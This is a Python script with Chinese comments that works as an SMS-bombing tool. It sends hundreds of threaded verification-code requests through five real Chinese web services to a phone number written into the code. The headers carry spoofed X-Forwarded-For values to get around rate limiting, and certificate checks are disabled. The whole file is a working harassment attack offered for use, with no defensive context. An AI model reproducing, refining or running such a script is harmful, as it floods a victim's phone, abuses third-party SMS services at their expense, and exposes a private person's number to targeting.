import sys, subprocess, random, threading, time, requests, urllib3
from concurrent.futures import ThreadPoolExecutor

# 自动补全必要组件
for pkg in ["requests", "urllib3"]:
    try: __import__(pkg)
    except ImportError: subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class NL_Turbo_Fast:
    def __init__(self, target):
        self.target = target
        self.apis = [
            ("云创动力", "https://jkyc.necloud.com.cn/QXRTOC/user/qxrtoc_wxxcxUserRegistCode", {"phone": target}, False),
            ("小熊美术", "https://www.xiaoxiongmeishu.com/api/m/v1/sms/sendCodeV2", {"bizOrigin": "APP", "mobile": f"+86{target}"}, True),
            ("供应管理", "https://www.scmmgr.cn/scm//orderRegisterUser/getPollCode", {"mobileNo": target, "msgType": "2"}, False),
            ("重庆轨道", "https://ycx.cqmetro.cn//bas/mc/v1/send-sms-code", {"mobile_phone": target, "sms_type": "0"}, True),
            ("在线挂号", "https://168api-tyxcx.zaiguahao.com/api/common/smsSend", {"applets_id": 1352, "phone": target}, True)
        ]

    def _send(self, idx):
        name, url, data, is_json = self.apis[idx % len(self.apis)]
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 14_6 like Mac)",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.1"
        }
        try:
            res = requests.post(url, json=data if is_json else None, data=None if is_json else data, 
                               headers=headers, timeout=5, verify=False)
            status = "✅" if res.status_code == 200 else "❌"
            print(f"[{idx:03d}] {status} {name} | 状态: {res.status_code} | 响应: {res.text[:20]}")
        except Exception as e:
            print(f"[{idx:03d}] ⚠️ {name} | 连接失败")

    def start(self, count=500, threads=20):
        print(f"🚀 任务启动: {self.target} | 总量: {count}")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self._send, range(1, count + 1))
        print("📊 任务已完成")

if __name__ == "__main__":
    # 配置：号码13599888558，500次请求
    engine = NL_Turbo_Fast("13599888558")
    engine.start(count=500, threads=30)
